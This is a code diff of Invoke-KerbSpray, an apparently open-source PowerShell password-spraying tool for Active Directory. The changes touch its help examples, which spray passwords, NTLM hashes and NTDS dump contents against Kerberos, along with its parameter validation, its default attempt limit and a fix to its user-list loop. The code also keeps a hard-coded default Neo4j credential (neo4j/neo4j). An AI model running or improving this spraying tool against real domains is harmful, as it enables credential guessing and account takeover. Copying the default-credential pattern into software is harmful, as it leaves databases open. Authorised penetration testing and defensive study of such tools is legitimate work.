@@ -18,7 +18,7 @@ function Invoke-KerbSpray {
     Specifies a file containing a list of usernames to send the AS-REQ for.
 
 .PARAMETER Password
-    Specifies the NTLM password for authentication.
+    Specifies the password for authentication.
 
 .PARAMETER Hash
     Specifies the NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.
@@ -60,7 +60,7 @@ function Invoke-KerbSpray {
     Specifies Neo4j server port.
 
 .EXAMPLE
-    PS C:\> Invoke-KerbSpray -UserName testuser -Domain ADATUM.CORP -Server 192.168.1.10
+    PS C:\> Invoke-KerbSpray -UserName testuser -Server 192.168.1.10
 
 .EXAMPLE
     PS C:\> Invoke-KerbSpray -UserName testuser -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Domain ADATUM.CORP
@@ -69,7 +69,7 @@ function Invoke-KerbSpray {
     PS C:\> Invoke-KerbSpray -UserFile .\users.lst -Password 'P@ssw0rd!' -Domain ADATUM.CORP
 
 .EXAMPLE
-    PS C:\> Invoke-KerbSpray -DumpFile contoso.ntds -Domain ADATUM.CORP
+    PS C:\> Invoke-KerbSpray -DumpFile .\contoso.ntds -Domain ADATUM.CORP -BloodHound
 
 .EXAMPLE
     PS C:\> Invoke-KerbSpray -Password 'Welcome2020' -Domain ADATUM.CORP -LdapUser testuser -LdapPass 'P@ssw0rd'
@@ -81,7 +81,7 @@ function Invoke-KerbSpray {
         [String]
         $Username,
 
-        [ValidateNotNullOrEmpty()]
+        [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $UserFile,
 
@@ -92,7 +92,7 @@ function Invoke-KerbSpray {
         [String]
         $Hash,
 
-        [ValidateNotNullOrEmpty()]
+        [ValidateScript({Test-Path $_ -PathType Leaf})]
         [String]
         $DumpFile,
 
@@ -111,7 +111,7 @@ function Invoke-KerbSpray {
         $LdapPass,
 
         [Int]
-        $Limit = 2,
+        $Limit = 1,
 
         [UInt32]
         $Delay = 0,
@@ -122,7 +122,7 @@ function Invoke-KerbSpray {
         [Switch]
         $BloodHound,
 
-        [ValidateNotNullOrEmpty()]
+		[ValidateNotNullOrEmpty()]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]
         $Credential = (New-Object System.Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),
@@ -140,7 +140,7 @@ function Invoke-KerbSpray {
         $Server = [Net.Dns]::GetHostAddresses($Domain) | Where-Object {$_.AddressFamily -eq 'InterNetwork'} | Select-Object -First 1 -ExpandProperty IPAddressToString
     }
     elseif ($Server -and -not $Domain) {
-        $searchString = "LDAP://" + $Server + "/RootDSE"
+        $searchString = "LDAP://$Server/RootDSE"
         $domainObject = New-Object System.DirectoryServices.DirectoryEntry($searchString, $null, $null)
         $Domain = $domainObject.rootDomainNamingContext[0] -replace 'DC=' -replace ',','.'
     }
@@ -169,18 +169,18 @@ function Invoke-KerbSpray {
     }
     elseif ($UserFile) {
         $UserFilePath = Resolve-Path -Path $UserFile
-        ForEach ($user in Get-Content $UserFilePath) {
+        ForEach ($username in Get-Content $UserFilePath) {
             if ($LdapUser) {
-                $user = Get-LdapUser -Identity $Username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
+                $user = Get-LdapUser -Identity $username -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
                 if ($user) {
                     $badPwdCount = $user.badPwdCount
                 }
             }
             if ($LdapUser -and -not $user) {
-                Write-Verbose "$($Username)@$($Domain) does not exist"
+                Write-Verbose "$($username)@$($Domain) does not exist"
             }
             else {
-                $cred = @{Username = $user; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
+                $cred = @{Username = $username; Password = $Password; Hash = $Hash; BadPwdCount = $badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
         }
